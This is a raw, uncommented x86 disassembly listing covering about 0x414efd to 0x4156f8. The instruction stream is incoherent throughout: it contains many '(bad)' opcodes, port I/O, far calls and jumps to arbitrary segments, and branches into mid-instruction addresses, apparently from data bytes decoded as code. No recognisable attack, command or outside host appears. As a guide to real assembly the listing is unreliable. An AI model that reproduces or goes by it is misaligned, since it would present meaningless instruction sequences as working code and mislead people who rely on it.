  414efd:	mov    WORD PTR [edi-0x11],ss
  414f00:	ret    0xf1fc
  414f03:	mov    al,ds:0x756f868
  414f08:	jne    0x414f67
  414f0a:	add    DWORD PTR [esi+0x2f303ade],0x42
  414f11:	(bad)  
  414f13:	out    dx,eax
  414f14:	and    al,0xde
  414f16:	pop    eax
  414f17:	sar    DWORD PTR [ecx],1
  414f19:	test   eax,0x8b18946f
  414f1e:	enter  0xeb6a,0x98
  414f22:	add    eax,0x7695d888
  414f27:	lahf   
  414f28:	jns    0x414fa5
  414f2a:	les    edx,FWORD PTR [esi-0x58]
  414f2d:	push   edi
  414f2e:	daa    
  414f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f30:	jae    0x414ec1
  414f32:	in     eax,dx
  414f33:	ss retf 
  414f35:	sahf   
  414f36:	xchg   ebp,eax
  414f37:	jnp    0x414fad
  414f39:	aas    
  414f3a:	mov    ds:0x6d62f44d,al
  414f3f:	lds    edx,FWORD PTR [eax+esi*2]
  414f42:	(bad)  
  414f44:	inc    esp
  414f45:	ret    0x2929
  414f48:	jb     0x414f62
  414f4a:	lods   al,BYTE PTR ds:[esi]
  414f4b:	adc    ebx,DWORD PTR [ebx+ecx*1+0x53]
  414f4f:	inc    ecx
  414f50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f51:	xchg   ecx,eax
  414f52:	dec    ecx
  414f53:	jle    0x414ef8
  414f55:	frstor [ebx+0x48822b0b]
  414f5b:	jns    0x414f53
  414f5d:	test   al,0x23
  414f5f:	sbb    BYTE PTR [edi+0x4e],bl
  414f62:	jle    0x414f40
  414f64:	out    dx,eax
  414f65:	push   ebp
  414f66:	adc    edi,DWORD PTR [edx+0x1]
  414f69:	mov    WORD PTR [eax],cs
  414f6b:	cmp    BYTE PTR [ebx-0x3c061a05],ah
  414f71:	test   BYTE PTR [ebx+0x19],dl
  414f74:	jo     0x414f8b
  414f76:	xor    DWORD PTR [edi],edx
  414f78:	mov    esi,0x3757d569
  414f7d:	ss daa 
  414f7f:	inc    esp
  414f80:	or     al,0x1b
  414f82:	inc    esp
  414f83:	lods   al,BYTE PTR ds:[esi]
  414f84:	call   0x20fa:0xa78981de
  414f8b:	and    dl,BYTE PTR [edx]
  414f8d:	loopne 0x414fc5
  414f8f:	cmp    eax,0x93dac60f
  414f94:	sar    BYTE PTR [ebx-0x638e0aee],cl
  414f9a:	out    0xe6,al
  414f9c:	mov    dl,0xf1
  414f9e:	out    dx,eax
  414f9f:	inc    ebp
  414fa0:	mov    cl,0x71
  414fa2:	jno    0x414f73
  414fa4:	sub    bh,BYTE PTR [edi-0x4b4146b9]
  414faa:	inc    eax
  414fab:	les    esi,FWORD PTR [esi-0x4d459ee9]
  414fb1:	dec    ebx
  414fb2:	xor    eax,0x5972e5f
  414fb7:	sbb    eax,0xe745f60e
  414fbc:	xor    BYTE PTR [edx+0x7e],0xf2
  414fc0:	mov    eax,0xc86f6b94
  414fc5:	pop    ebp
  414fc6:	or     cl,cl
  414fc8:	cmp    esi,eax
  414fca:	add    ch,BYTE PTR ds:0x6c80b7a2
  414fd0:	push   ds
  414fd1:	jmp    0xe390f8d8
  414fd6:	and    BYTE PTR [ebp+0x6ae40a65],ah
  414fdc:	cs inc edx
  414fde:	mov    bl,0xb6
  414fe0:	mov    al,ds:0x422ae798
  414fe5:	inc    eax
  414fe6:	xlat   BYTE PTR cs:[ebx]
  414fe8:	push   ebx
  414fe9:	jle    0x414fab
  414feb:	cmc    
  414fec:	js     0x414fbf
  414fee:	imul   ebp,DWORD PTR [edi],0xffffffa1
  414ff1:	jecxz  0x415029
  414ff3:	dec    eax
  414ff4:	mov    dh,0xe2
  414ff6:	shr    esp,cl
  414ff8:	repz ret 0x3eb6
  414ffc:	loope  0x41501e
  414ffe:	inc    eax
  414fff:	cmp    ecx,DWORD PTR [eax+0x3caa6c54]
  415005:	jne    0x41500e
  415007:	inc    ecx
  415008:	mov    ah,0xa2
  41500a:	add    DWORD PTR [ebp-0x44],edi
  41500d:	jno    0x414f92
  41500f:	adc    DWORD PTR [ebp-0x53],0x240392d8
  415016:	mov    ebp,0xa4de2b04
  41501b:	aad    0x97
  41501d:	jecxz  0x414fb6
  41501f:	out    0x8b,al
  415021:	inc    edx
  415022:	fisttp DWORD PTR [ebx+0x44]
  415025:	daa    
  415026:	xchg   ecx,eax
  415027:	mov    al,0x39
  41502a:	ret    0x2500
  41502d:	cli    
  41502e:	or     dl,BYTE PTR [edi]
  415030:	pop    es
  415031:	stos   DWORD PTR es:[edi],eax
  415032:	lock ins DWORD PTR es:[edi],dx
  415034:	lahf   
  415035:	add    al,0x3a
  415037:	hlt    
  415038:	shr    DWORD PTR [esi-0x2b],0xca
  41503c:	aam    0x37
  41503e:	fst    QWORD PTR [ebp-0x2f]
  415041:	push   ecx
  415042:	(bad)  
  415043:	outs   dx,DWORD PTR ds:[esi]
  415044:	mov    ebp,0xf913c154
  415049:	mov    ebp,0xdbc63b78
  41504e:	cdq    
  41504f:	ds jbe 0x4150cf
  415052:	test   ebx,ebp
  415054:	jnp    0x414ff2
  415056:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415058:	test   DWORD PTR [ebp-0x32],esi
  41505b:	mov    ebp,0x2c59d108
  415060:	popa   
  415061:	jmp    0x41507a
  415063:	inc    ecx
  415064:	aad    0x99
  415066:	xor    al,0x2d
  415068:	cmp    BYTE PTR [eax+esi*8+0x20],al
  41506c:	jmp    0x46769814
  415071:	dec    ebp
  415072:	add    DWORD PTR [ecx],0x7c
  415075:	pop    ss
  415076:	fdiv   DWORD PTR [edi-0xc2d568a]
  41507c:	nop
  41507d:	pushf  
  41507e:	mov    esp,0x2b4320a7
  415083:	xor    eax,0xfeb92453
  415088:	lds    ecx,FWORD PTR [ecx-0x1c0bb687]
  41508e:	push   edi
  41508f:	(bad)  
  415090:	leave  
  415091:	test   DWORD PTR [esi],0x19a99574
  415097:	sbb    eax,0x3d970d2a
  41509c:	add    cl,bh
  41509e:	or     DWORD PTR [eax-0x6],eax
  4150a1:	cmp    eax,DWORD PTR [esi-0x789b9721]
  4150a7:	lods   al,BYTE PTR ds:[esi]
  4150a8:	fild   WORD PTR es:0x9e66429e
  4150af:	int3   
  4150b0:	dec    ecx
  4150b1:	mov    eax,0xe6b31355
  4150b6:	pop    esi
  4150b7:	pop    ds
  4150b8:	sub    eax,DWORD PTR [edi]
  4150ba:	sub    BYTE PTR [edx],cl
  4150bc:	sub    al,0xa3
  4150be:	cmp    edi,ecx
  4150c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150c1:	or     al,0x8a
  4150c3:	adc    dl,dl
  4150c5:	loopne 0x4150b0
  4150c7:	cmp    DWORD PTR [ebp+0x7bb3969b],esp
  4150cd:	pusha  
  4150ce:	mov    ebx,0x31f98b08
  4150d3:	inc    ecx
  4150d4:	or     DWORD PTR [ecx+0x2f],ebp
  4150d7:	daa    
  4150d8:	(bad)  
  4150d9:	cli    
  4150da:	call   0x3c3aff43
  4150df:	cmp    esp,ebx
  4150e1:	pop    ds
  4150e2:	add    al,0xef
  4150e4:	mov    esi,0xa8116d0b
  4150e9:	fs (bad) 
  4150eb:	shr    BYTE PTR [esi],1
  4150ed:	sbb    BYTE PTR [eax],bh
  4150ef:	loop   0x41510e
  4150f1:	push   0xffffff9c
  4150f3:	pop    es
  4150f4:	mov    ecx,0xd188dd88
  4150f9:	adc    BYTE PTR [edx],ch
  4150fb:	inc    esp
  4150fc:	mov    dh,bl
  4150fe:	outs   dx,DWORD PTR ds:[esi]
  4150ff:	daa    
  415100:	mov    esp,0x4e2e2a64
  415105:	xchg   edx,eax
  415106:	pop    ss
  415107:	add    dh,BYTE PTR [ebp+0x1027a279]
  41510d:	sub    dh,BYTE PTR [edx-0x49c7c8dd]
  415113:	ret    0x814c
  415116:	shl    DWORD PTR ds:0xe6b3ee6e,cl
  41511c:	push   es
  41511d:	xchg   esp,eax
  41511e:	jecxz  0x415118
  415120:	mov    eax,0xf3aa9c0a
  415125:	xor    ecx,DWORD PTR [esi]
  415127:	arpl   WORD PTR [ecx],cx
  415129:	rcr    DWORD PTR [eax+0x4f32f4a2],0x27
  415130:	cli    
  415131:	aas    
  415132:	mov    bl,0xb2
  415134:	sbb    eax,0x6ecf4788
  415139:	mov    esp,0xd26fe9f4
  41513e:	adc    al,0xd6
  415140:	dec    eax
  415141:	sbb    ah,BYTE PTR [ecx-0x475485e]
  415147:	push   eax
  415148:	gs pop ecx
  41514a:	mov    ebp,0x4db353f2
  41514f:	jle    0x415146
  415151:	mov    ?,WORD PTR [ecx+0x65]
  415154:	jmp    0x4151a9
  415156:	test   DWORD PTR ds:0x6036adbd,ebp
  41515c:	cmp    BYTE PTR [esi],dl
  41515e:	push   esp
  41515f:	shl    dh,1
  415161:	stos   BYTE PTR es:[edi],al
  415162:	cmp    eax,0x48259976
  415167:	ins    DWORD PTR es:[edi],dx
  415168:	les    ebx,FWORD PTR [ebx]
  41516a:	fcmove st,st(2)
  41516c:	enter  0xf4e1,0x76
  415170:	imul   eax,DWORD PTR [ebp+ebx*2+0x562ab9e1],0xffffffb3
  415178:	inc    ecx
  415179:	mov    dh,0x9d
  41517b:	outs   dx,DWORD PTR ds:[esi]
  41517c:	in     eax,dx
  41517d:	inc    edi
  41517e:	inc    ebx
  41517f:	push   esp
  415180:	sub    al,BYTE PTR [edi-0x703ed70a]
  415186:	pop    eax
  415187:	data16 sub BYTE PTR [edx-0x4f],al
  41518b:	sub    dh,dl
  41518d:	or     esp,DWORD PTR [ebx-0x6452e8b5]
  415193:	jmp    0x4151cc
  415195:	stos   DWORD PTR es:[edi],eax
  415196:	jae    0xea6584f4
  41519c:	shl    BYTE PTR [ecx-0x2ee4abfc],1
  4151a2:	dec    esp
  4151a3:	retf   
  4151a4:	arpl   WORD PTR [ecx-0x36],di
  4151a7:	push   DWORD PTR [ecx]
  4151a9:	sbb    DWORD PTR [ebp-0x9ab22a3],edi
  4151af:	adc    eax,0xc62b7072
  4151b4:	(bad)  
  4151b5:	mov    WORD PTR [edx],?
  4151b7:	mov    eax,ds:0x478a4f47
  4151bc:	sbb    eax,0xed49e270
  4151c1:	pop    es
  4151c2:	mov    al,ds:0x17c80c58
  4151c7:	retf   0xc4c2
  4151ca:	push   eax
  4151cb:	xor    eax,0x39e54cdd
  4151d0:	jg     0x415156
  4151d2:	sbb    eax,DWORD PTR [edi-0x44e6a6ea]
  4151d8:	iret   
  4151d9:	dec    ebx
  4151da:	mov    cl,0x54
  4151dc:	xor    al,0x63
  4151de:	rcl    esi,0xca
  4151e1:	(bad)  
  4151e2:	jp     0x415164
  4151e4:	pushf  
  4151e5:	data16 fistp QWORD PTR [ebx-0x2894f9ef]
  4151ec:	out    dx,eax
  4151ed:	repz les esp,FWORD PTR [eax]
  4151f0:	push   edi
  4151f1:	retf   
  4151f2:	mov    eax,0x8ccb1dda
  4151f7:	add    eax,0x415dc4e7
  4151fc:	les    ebx,FWORD PTR [esi-0x59]
  4151ff:	loope  0x4151ba
  415201:	fs jg  0x415225
  415204:	mov    DWORD PTR [ecx],eax
  415206:	xchg   ebp,eax
  415207:	mov    al,0x6b
  415209:	adc    eax,0xe1c1ed85
  41520e:	scas   al,BYTE PTR es:[edi]
  41520f:	push   edi
  415210:	xchg   edx,eax
  415211:	mov    bl,0x48
  415213:	cmp    BYTE PTR [esi-0x47f090b5],dh
  415219:	inc    ebx
  41521a:	mov    cl,0x43
  41521c:	out    0x86,eax
  41521e:	adc    DWORD PTR [eax],0x62
  415221:	pop    ds
  415222:	outs   dx,BYTE PTR ds:[esi]
  415223:	push   esi
  415224:	sub    bh,dh
  415226:	pop    esi
  415227:	cs int 0x33
  41522a:	jae    0x415218
  41522c:	out    0x56,eax
  41522e:	add    esp,DWORD PTR [ecx-0x28]
  415231:	and    DWORD PTR fs:[eax+0x28],edx
  415235:	push   ebx
  415236:	jl     0x4151ea
  415238:	addr16 out 0xbb,eax
  41523b:	test   eax,0x6b5b05dd
  415240:	stc    
  415241:	pop    ecx
  415242:	sar    DWORD PTR [ebx],cl
  415244:	dec    ebp
  415245:	in     al,0x26
  415247:	and    BYTE PTR [ebp-0x58],dh
  41524a:	icebp  
  41524b:	addr16 jle 0x415241
  41524e:	lds    esp,FWORD PTR [edx]
  415250:	loop   0x4152a8
  415252:	jo     0x41526f
  415254:	push   cs
  415255:	mov    ecx,0xd0aed8d4
  41525a:	std    
  41525b:	mov    ecx,0x4a1c79cd
  415260:	sub    eax,0x9f5f8ab9
  415265:	fprem  
  415267:	(bad)  
  415268:	popf   
  415269:	xor    DWORD PTR ds:0x548543fd,ecx
  41526f:	(bad)  
  415271:	cli    
  415272:	rcr    DWORD PTR [ebx+0x2646e279],1
  415278:	xor    al,cl
  41527a:	fmul   DWORD PTR [ebx]
  41527c:	bound  ecx,QWORD PTR [ebx+0x30a167e1]
  415282:	adc    ecx,ebp
  415284:	arpl   WORD PTR [ecx],ax
  415286:	(bad)
  41528a:	test   BYTE PTR [ebx+0x4406cc9f],0x6a
  415291:	fld    QWORD PTR [esi-0x5e]
  415294:	outs   dx,DWORD PTR ds:[esi]
  415295:	cmp    esi,0xffffff80
  415298:	sub    al,0xea
  41529a:	aas    
  41529b:	stc    
  41529c:	adc    eax,0x77800704
  4152a1:	push   eax
  4152a2:	sbb    DWORD PTR [ecx+0x3f],esi
  4152a5:	mov    bl,0x0
  4152a7:	clc    
  4152a8:	adc    DWORD PTR [ebx+0x6c],ebx
  4152ab:	and    DWORD PTR [edi-0xecf6ad0],0xffffff81
  4152b2:	in     al,dx
  4152b3:	sbb    al,0x86
  4152b5:	xor    DWORD PTR ds:[ecx+ebx*4+0x2c],edi
  4152ba:	out    dx,eax
  4152bb:	int3   
  4152bc:	and    ebp,DWORD PTR [edx]
  4152be:	in     eax,0xa5
  4152c0:	daa    
  4152c1:	adc    DWORD PTR ds:0x9c116a1b,eax
  4152c7:	dec    eax
  4152c8:	push   ebx
  4152c9:	xor    esp,DWORD PTR [esi]
  4152cb:	shl    ebx,0x8b
  4152ce:	sub    al,0x8e
  4152d0:	inc    ebx
  4152d1:	cld    
  4152d2:	(bad)  
  4152d3:	repz out 0x2e,al
  4152d6:	sbb    DWORD PTR [esi],esp
  4152d8:	shl    BYTE PTR [edi-0x91fbe9d],cl
  4152de:	aas    
  4152df:	cmp    BYTE PTR [edx],ch
  4152e1:	dec    esi
  4152e2:	jo     0x4152bb
  4152e4:	sub    DWORD PTR [eax-0x7],eax
  4152e7:	jb     0x415343
  4152e9:	mov    al,0xc3
  4152eb:	test   bl,dl
  4152ed:	ficomp DWORD PTR [ecx]
  4152ef:	pop    eax
  4152f0:	add    DWORD PTR [ecx],0xffffffad
  4152f3:	cli    
  4152f4:	push   eax
  4152f5:	jle    0x415319
  4152f7:	and    BYTE PTR [esi+0x713497c3],bl
  4152fd:	mov    bl,BYTE PTR [esi]
  4152ff:	shr    DWORD PTR [esi*2-0x626e8826],cl
  415306:	pop    eax
  415307:	(bad)  
  415308:	iret   
  415309:	mov    eax,0x3e3c457c
  41530e:	daa    
  41530f:	and    DWORD PTR [edi-0x47],ebx
  415312:	jae    0x4152e6
  415314:	xor    eax,0x2c4d59e1
  415319:	rol    ch,1
  41531b:	push   es
  41531c:	adc    eax,0x93422952
  415321:	mov    ebp,0x954058bb
  415326:	mov    edx,0x1c92bbb0
  41532b:	in     eax,0xfa
  41532d:	mov    ebx,0x68239de9
  415332:	or     DWORD PTR [ebp+0x7bceed61],eax
  415338:	pop    eax
  415339:	mov    eax,eax
  41533b:	int3   
  41533c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41533d:	xor    ch,BYTE PTR [eax-0x77acd6ca]
  415343:	aas    
  415344:	daa    
  415345:	out    dx,al
  415346:	dec    eax
  415347:	and    eax,0x5572f60a
  41534c:	cmp    ebp,esp
  41534e:	sub    al,0x96
  415350:	in     eax,dx
  415351:	pop    edx
  415352:	cmc    
  415353:	mov    BYTE PTR [edi-0x7367547e],dh
  415359:	out    dx,eax
  41535a:	fwait
  41535b:	stos   DWORD PTR es:[edi],eax
  41535c:	inc    esp
  41535d:	sahf   
  41535e:	or     eax,0x3797b9c3
  415363:	mov    ebx,0x6cf3bb20
  415368:	mov    ds:0xecb62ddf,al
  41536d:	inc    eax
  41536e:	das    
  41536f:	pop    ecx
  415370:	rol    bl,cl
  415372:	cmp    eax,0xf9f23de4
  415377:	ss pop esi
  415379:	jl     0x4153ed
  41537b:	scas   eax,DWORD PTR es:[edi]
  41537c:	jl     0x415321
  41537e:	dec    edi
  41537f:	stos   BYTE PTR es:[edi],al
  415380:	iret   
  415381:	mov    ebp,0x3f1af764
  415386:	and    BYTE PTR [ebp-0x65879b90],0xc1
  41538d:	(bad)  
  41538e:	mov    WORD PTR [eax+0x68],ss
  415391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415392:	xor    al,0x4d
  415394:	sub    eax,esi
  415396:	lods   al,BYTE PTR ds:[esi]
  415397:	imul   edi,DWORD PTR [edx-0x3aa129c7],0x5b1bdf70
  4153a1:	stc    
  4153a2:	add    al,0x19
  4153a4:	mov    ebx,ds
  4153a6:	xchg   DWORD PTR [ecx+0x785ece68],esp
  4153ac:	ror    DWORD PTR [eax-0x468ea614],0x3e
  4153b3:	or     bh,BYTE PTR [ebx]
  4153b5:	inc    ebx
  4153b6:	xchg   edi,eax
  4153b7:	iret   
  4153b8:	enter  0xcfd5,0x8b
  4153bc:	lahf   
  4153bd:	dec    eax
  4153be:	rcl    DWORD PTR [edi],0x1b
  4153c1:	dec    ecx
  4153c2:	popf   
  4153c3:	lock or BYTE PTR [ecx-0x32],bh
  4153c7:	jl     0x415357
  4153c9:	sti    
  4153ca:	test   eax,0xe64594b9
  4153cf:	inc    ebx
  4153d0:	ins    BYTE PTR es:[edi],dx
  4153d1:	or     esi,DWORD PTR [ecx+0x31eb067]
  4153d7:	aam    0xad
  4153d9:	push   edx
  4153da:	(bad)  [ebx]
  4153dc:	jl     0x415447
  4153de:	retf   
  4153df:	mov    al,0xf
  4153e1:	adc    ch,dl
  4153e3:	inc    eax
  4153e4:	add    BYTE PTR [eax],ch
  4153e6:	pop    edx
  4153e7:	adc    al,BYTE PTR ds:0x67a09092
  4153ed:	mov    BYTE PTR [ecx+ebx*2+0x39253a21],ch
  4153f4:	lds    edx,FWORD PTR [ebx-0xc9a5b20]
  4153fa:	les    edi,FWORD PTR [ebp-0x33b032a9]
  415400:	jne    0x41544d
  415402:	jb     0x415393
  415404:	data16 mov dh,0xf5
  415407:	in     eax,0xc6
  415409:	(bad)  
  41540a:	mov    fs,WORD PTR [esi-0x4d]
  41540d:	int3   
  41540e:	into   
  41540f:	lea    esi,[ebp+0x2ef6a5ac]
  415415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415416:	(bad)
  41541a:	gs xor eax,0x4d01862
  415420:	js     0x4153af
  415422:	xor    al,0x2e
  415424:	push   cs
  415425:	mov    ebp,DWORD PTR [edi-0x63d6ff5e]
  41542b:	xchg   edx,eax
  41542c:	mov    bh,0xbe
  41542e:	cdq    
  41542f:	adc    bh,BYTE PTR [esi]
  415431:	add    ebx,DWORD PTR [ebx]
  415433:	sub    eax,0x1a281eea
  415438:	sbb    al,0x4a
  41543a:	and    DWORD PTR [eax],esp
  41543c:	sbb    DWORD PTR es:[eax-0x41],ebx
  415440:	icebp  
  415441:	mov    ecx,0xe201cef4
  415446:	jb     0x4154af
  415448:	sbb    esp,DWORD PTR [edx+eax*8]
  41544b:	mov    cl,bh
  41544d:	push   eax
  41544e:	loop   0x415403
  415450:	iret   
  415451:	lock lea edi,[ebp-0x26343e50]
  415458:	sar    DWORD PTR [edx+0x662a271a],cl
  41545e:	cmp    al,0x6
  415460:	lods   eax,DWORD PTR ds:[esi]
  415461:	push   cs
  415462:	push   0xffffffb8
  415464:	mov    edx,0xc5e75e37
  415469:	push   esp
  41546a:	mov    esi,0xa6d585aa
  41546f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415470:	mov    esp,0x88a8eb34
  415475:	ss int3 
  415477:	out    0x51,al
  415479:	push   cs
  41547a:	adc    BYTE PTR [ebx],0xa
  41547d:	je     0x4154da
  41547f:	dec    ecx
  415480:	out    dx,al
  415481:	xor    edx,esi
  415483:	daa    
  415484:	push   ds
  415485:	adc    ebx,eax
  415487:	out    0xf2,eax
  415489:	add    eax,DWORD PTR [edx+ebx*1-0x71]
  41548d:	sti    
  41548e:	add    al,BYTE PTR [esi-0x1]
  415491:	pop    esp
  415492:	mov    bh,0x76
  415494:	xchg   edi,eax
  415495:	pop    esp
  415496:	jo     0x4154d2
  415498:	stc    
  415499:	xchg   edi,eax
  41549a:	lock add bh,BYTE PTR [ebx-0x56138fb4]
  4154a1:	jb     0x4154e9
  4154a3:	lock xor al,0xa6
  4154a6:	or     bh,0xa7
  4154a9:	pop    ebp
  4154aa:	xor    bl,bh
  4154ac:	inc    eax
  4154ad:	sub    BYTE PTR [ecx],dl
  4154af:	not    BYTE PTR [eax+0x7f]
  4154b2:	dec    edx
  4154b3:	aam    0xb6
  4154b5:	push   0xac7fc9e9
  4154ba:	ins    BYTE PTR es:[edi],dx
  4154bb:	pusha  
  4154bc:	sbb    eax,0xd1dcdc5c
  4154c1:	popf   
  4154c2:	fnsave [ebx-0x15cbcae7]
  4154c8:	leave  
  4154c9:	push   edx
  4154ca:	gs push esp
  4154cc:	(bad)  
  4154cd:	mov    al,ds:0xd0909045
  4154d2:	push   ecx
  4154d3:	cli    
  4154d4:	sbb    esi,DWORD PTR [edx-0x27]
  4154d7:	ror    DWORD PTR [eax+eax*1-0x74],1
  4154db:	add    dh,bh
  4154dd:	and    esp,ebp
  4154df:	adc    dh,BYTE PTR [ebx]
  4154e1:	push   edx
  4154e2:	or     dl,BYTE PTR [eax+edi*2-0xb78ef9d]
  4154e9:	dec    edx
  4154ea:	ja     0x41548d
  4154ec:	mov    bl,0x12
  4154ee:	clc    
  4154ef:	pushf  
  4154f0:	(bad)  
  4154f1:	adc    DWORD PTR [edi-0x3cf5df2b],ebp
  4154f7:	fcom   DWORD PTR [esi-0x7f2fb206]
  4154fd:	(bad)  
  4154fe:	push   esp
  4154ff:	adc    cl,BYTE PTR [edi+0x227de0ca]
  415505:	sub    eax,0x1c84bead
  41550a:	cmp    eax,0xf839a9fd
  41550f:	pop    ebx
  415510:	cmp    BYTE PTR [ebx+0x73f34293],bh
  415516:	inc    eax
  415517:	mov    ebx,0xcd989cdf
  41551c:	jge    0x4154e6
  41551e:	out    0xc9,al
  415520:	sahf   
  415521:	fisttp QWORD PTR [edi-0x55]
  415524:	adc    DWORD PTR [ebp-0x24ce0d49],ecx
  41552a:	add    eax,0xcfa5902b
  41552f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415530:	add    BYTE PTR [edx],ah
  415532:	xchg   esp,eax
  415533:	xor    DWORD PTR [ebp-0x3aa25012],ebp
  415539:	das    
  41553a:	mov    esp,0xa3a914de
  41553f:	enter  0xc08a,0xaf
  415543:	cmp    eax,0x787e8a59
  415548:	and    al,0xea
  41554a:	lds    ebx,FWORD PTR [ebx]
  41554c:	cmp    DWORD PTR [edi+0x29],0x64cb473e
  415553:	dec    esi
  415554:	mov    esi,0xe4a156bc
  415559:	or     DWORD PTR [edx+0x1aaaaa47],esp
  41555f:	mov    edx,0x8af21296
  415564:	lods   al,BYTE PTR ds:[esi]
  415565:	inc    ebp
  415566:	jmp    0x7507:0xdde69544
  41556d:	or     eax,DWORD PTR [eax]
  41556f:	cmc    
  415570:	in     al,0x92
  415572:	outs   dx,BYTE PTR ds:[esi]
  415573:	or     cl,BYTE PTR [edx+0x8d6e875]
  415579:	daa    
  41557a:	int    0x6
  41557c:	arpl   ax,cx
  41557e:	and    ebp,DWORD PTR [esi-0x30]
  415581:	jge    0x415518
  415583:	fnstsw WORD PTR [edi-0x69]
  415586:	xchg   edi,eax
  415587:	push   eax
  415588:	sub    edi,DWORD PTR [eax+edi*8-0x2365d960]
  41558f:	pushf  
  415590:	inc    edx
  415591:	ss push esi
  415593:	inc    ebx
  415594:	aaa    
  415595:	dec    ebp
  415596:	mov    ecx,eax
  415598:	icebp  
  415599:	xor    BYTE PTR [ecx-0x2578fb4c],bh
  41559f:	inc    eax
  4155a0:	push   0xf
  4155a2:	jnp    0x415569
  4155a4:	outs   dx,BYTE PTR ds:[esi]
  4155a5:	scas   al,BYTE PTR es:[edi]
  4155a6:	jecxz  0x415597
  4155a8:	jae    0x415624
  4155aa:	daa    
  4155ab:	sub    esp,esp
  4155ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155ae:	push   DWORD PTR [edx]
  4155b0:	add    DWORD PTR [edi-0x23],0x9f485ae1
  4155b7:	mov    al,0x8f
  4155b9:	inc    edx
  4155ba:	js     0x4155b8
  4155bc:	test   eax,0x9d048938
  4155c1:	jo     0x41561d
  4155c3:	out    0xe2,al
  4155c5:	mov    al,ds:0xbe306820
  4155ca:	sub    bh,BYTE PTR [edx]
  4155cc:	repz test BYTE PTR [ebp-0x11a7b45a],ah
  4155d3:	cmp    al,0xca
  4155d5:	out    0xe8,eax
  4155d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155d8:	mov    eax,0x4611c965
  4155dd:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4155df:	fild   WORD PTR [ecx]
  4155e1:	iret   
  4155e2:	push   edx
  4155e3:	in     al,0xf5
  4155e5:	xchg   ebp,eax
  4155e6:	pop    esi
  4155e7:	psllq  mm1,mm6
  4155ea:	jp     0x415616
  4155ec:	cmp    BYTE PTR [edi],bh
  4155ee:	addr16 mov eax,0x1968ff93
  4155f4:	add    DWORD PTR [esi],edi
  4155f6:	outs   dx,BYTE PTR ds:[esi]
  4155f7:	das    
  4155f8:	outs   dx,BYTE PTR ds:[esi]
  4155f9:	mov    ebx,0x1583dd04
  4155fe:	xor    dl,BYTE PTR [esi+ecx*8+0x4d]
  415602:	mov    al,ds:0xf0277ef3
  415607:	rcl    DWORD PTR [ebx-0x15593cb1],1
  41560d:	lds    ebx,FWORD PTR [ebp+0x73]
  415610:	hlt    
  415611:	adc    esp,DWORD PTR [esi]
  415613:	mov    edi,0x605e5f66
  415618:	push   ss
  415619:	rol    DWORD PTR [eax+0x24],cl
  41561c:	add    DWORD PTR [ebx+0x6c103c0d],ebp
  415622:	cli    
  415623:	lods   al,BYTE PTR ds:[esi]
  415624:	scas   al,BYTE PTR es:[edi]
  415625:	xchg   esp,eax
  415626:	aam    0xd7
  415628:	pop    es
  415629:	fs push eax
  41562b:	push   ds
  41562c:	xor    BYTE PTR [esi],dl
  41562e:	push   ebx
  41562f:	dec    esi
  415630:	daa    
  415631:	or     al,0x4d
  415633:	pushf  
  415634:	rcpps  xmm4,XMMWORD PTR [edi-0x724e22fa]
  41563b:	test   al,0xa5
  41563d:	and    ch,BYTE PTR [edx]
  41563f:	(bad)  
  415641:	or     bl,BYTE PTR [edi-0x3ab548ad]
  415647:	scas   al,BYTE PTR es:[edi]
  415648:	js     0x415668
  41564a:	and    al,0xb7
  41564c:	and    dl,BYTE PTR [esi+edi*2-0x510ea72a]
  415653:	pushf  
  415654:	mov    ah,0x3c
  415656:	add    al,0xd1
  415658:	imul   ebp,DWORD PTR [ebx],0xcb41fefe
  41565e:	call   0x8bb9e5dd
  415663:	and    al,BYTE PTR [esi-0x1dd68224]
  415669:	jbe    0x415663
  41566b:	xor    DWORD PTR [ebx+0xe],eax
  41566e:	inc    edi
  41566f:	arpl   WORD PTR [ebx],sp
  415671:	(bad)  
  415672:	fxam   
  415674:	repnz loopne 0x415653
  415677:	xor    DWORD PTR [ebp+0x28],ebp
  41567a:	mov    ah,BYTE PTR [esi-0x23]
  41567d:	xchg   edi,eax
  41567e:	push   0xb1437a49
  415683:	retf   0x47c6
  415686:	pop    eax
  415687:	sti    
  415688:	in     eax,dx
  415689:	mov    esi,0xf50e44c3
  41568e:	pusha  
  41568f:	adc    DWORD PTR fs:[eax-0xf],edx
  415693:	inc    edi
  415694:	xor    al,0x35
  415696:	ret    
  415697:	xchg   bh,bl
  415699:	sub    ecx,ebp
  41569b:	xor    al,0x5c
  41569d:	iret   
  41569e:	lea    edi,[ebp+0x45]
  4156a1:	jnp    0x415684
  4156a3:	mov    dh,BYTE PTR [ebp+0x31]
  4156a6:	push   DWORD PTR [edx+0x34]
  4156a9:	out    0x23,al
  4156ab:	xchg   ebx,eax
  4156ac:	adc    DWORD PTR [esi-0x441a222b],esi
  4156b2:	xchg   ebp,eax
  4156b3:	std    
  4156b4:	repz imul ebp,esp,0x8cc3f41c
  4156bb:	cmp    eax,0xed13ca7d
  4156c0:	int3   
  4156c1:	pop    esp
  4156c2:	jg     0x415674
  4156c4:	mov    ebx,0xa188e413
  4156c9:	xor    eax,DWORD PTR [ebx-0x14]
  4156cc:	mov    ebp,DWORD PTR [ebx]
  4156ce:	sub    DWORD PTR [esi+esi*8+0x67],edi
  4156d2:	lods   al,BYTE PTR ds:[esi]
  4156d3:	(bad)  
  4156d4:	push   0xc2b7bdbc
  4156d9:	iret   
  4156da:	mov    ch,0xda
  4156dc:	mov    al,ds:0xbbfa3c9d
  4156e1:	add    BYTE PTR [esi+0x17ea26a4],ah
  4156e7:	test   DWORD PTR [eax+0x5d373512],0x602b26c1
  4156f1:	rcr    DWORD PTR [ecx],0x1
  4156f4:	loopne 0x4156c9
  4156f6:	pop    ds
  4156f7:	ins    DWORD PTR es:[edi],dx
  4156f8:	sbb    ch,BYTE PTR [eiz*1-0x43c47131]
